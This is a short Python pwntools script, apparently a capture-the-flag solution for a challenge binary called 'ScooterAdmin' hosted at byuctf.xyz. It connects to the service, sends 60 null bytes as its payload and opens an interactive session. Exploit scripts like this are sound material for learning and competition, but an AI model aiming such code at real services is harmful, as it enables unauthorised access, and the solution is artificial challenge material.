from pwn import *


# initialize the binary
binary = "./ScooterAdmin"
elf = context.binary = ELF(binary, checksec=False,)

gs = """
break main
continue
"""

if args.REMOTE:
    p = remote("byuctf.xyz", 40012)
elif args.GDB:
    p = gdb.debug(binary, gdbscript=gs)
else:
    p = elf.process()

# send \x00 60 times
p.send(b"\x00" * 60)
p.interactive()